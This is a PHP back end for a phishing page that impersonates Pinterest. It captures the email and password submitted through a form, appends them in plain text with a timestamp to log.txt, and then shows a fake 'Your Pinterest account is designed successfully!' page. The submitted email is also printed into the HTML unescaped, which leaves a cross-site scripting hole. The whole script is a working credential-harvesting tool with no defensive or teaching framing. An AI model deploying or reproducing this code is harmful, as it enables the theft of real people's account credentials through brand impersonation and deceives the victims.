<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture the email and password from the form
    $username = $_POST['email']; // Use 'email' instead of 'username'
    $password = $_POST['password'];

    // Open the file in append mode
    $file = fopen("log.txt", "a");

    // Write the username and password to the file
    $log_entry = "Email: $username, Password: $password, Timestamp: " . date("Y-m-d H:i:s") . "\n";
    fwrite($file, $log_entry);

    // Close the file
    fclose($file);

    // Display a success message
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Account Creation Success</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
                background-color: #f3f3f3;
            }
            h1 {
                color: #e60023;
            }
            p {
                color: #555;
                font-size: 16px;
            }
        </style>
    </head>
    <body>
        <h1>Your Pinterest account is designed successfully!</h1>
        <p>Welcome to Pinterest, $username!</p>
    </body>
    </html>";
} else {
    echo "<h1>Invalid request method.</h1>";
}
?>
